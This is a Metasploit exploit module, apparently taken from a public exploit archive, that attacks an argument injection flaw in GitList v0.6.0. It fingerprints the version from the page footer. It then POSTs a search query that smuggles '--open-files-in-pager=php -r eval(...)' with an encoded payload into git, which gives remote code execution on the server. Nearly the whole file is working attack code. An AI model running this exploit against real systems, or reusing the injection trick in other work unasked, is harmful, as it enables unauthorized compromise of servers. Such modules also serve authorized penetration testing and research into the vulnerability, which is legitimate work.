# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "GitList v0.6.0 Argument Injection Vulnerability",
      &#039;Description&#039;    => %q{
        This module exploits an argument injection vulnerability in GitList v0.6.0.
        The vulnerability arises from GitList improperly validating input using the php function
        &#039;escapeshellarg&#039;.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Kacper Szurek&#039;, # EDB POC
          &#039;Shelby Pace&#039;    # Metasploit Module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;EDB&#039;, &#039;44548&#039; ],
          [ &#039;URL&#039;, &#039;https://security.szurek.pl/exploit-bypass-php-escapeshellarg-escapeshellcmd.html&#039;]
        ],
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [ &#039;GitList v0.6.0&#039;, { } ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        => { &#039;BadChars&#039; => &#039;\&#039;"&#039; },
      &#039;DisclosureDate&#039; => "Apr 26 2018",
      &#039;DefaultTarget&#039;  => 0))
  end

  def check
    uri = normalize_uri(target_uri.path, &#039;/gitlist/&#039;)
    res = send_request_cgi(
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     => uri
    )

    if res && res.code == 200 && /Powered by .*GitList 0\.6\.0/.match(res.body)
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    postUri = normalize_uri(target_uri.path, &#039;/gitlist/tree/c/search&#039;)
    cmd = &#039;--open-files-in-pager=php -r "eval(\\"&#039;
    cmd << payload.encoded
    cmd << &#039;\\");"&#039;
    send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => postUri,
      &#039;vars_post&#039; => { &#039;query&#039; => cmd }
    )
  end
end

